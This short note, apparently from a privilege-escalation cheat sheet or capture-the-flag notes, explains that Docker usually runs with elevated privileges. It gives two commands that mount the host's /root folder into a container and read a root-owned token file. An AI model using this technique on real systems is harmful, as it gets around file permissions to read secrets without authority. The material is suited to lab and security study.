#Docker
***
Most of the time the docker process runs with escalated privileges. We can use this, for example to read the `token.txt` file owned by the `root` user in the root folder as follows:
```
docker run -it -v /root:/test ubuntu:18.04 /bin/bash
cat /test/token.txt
```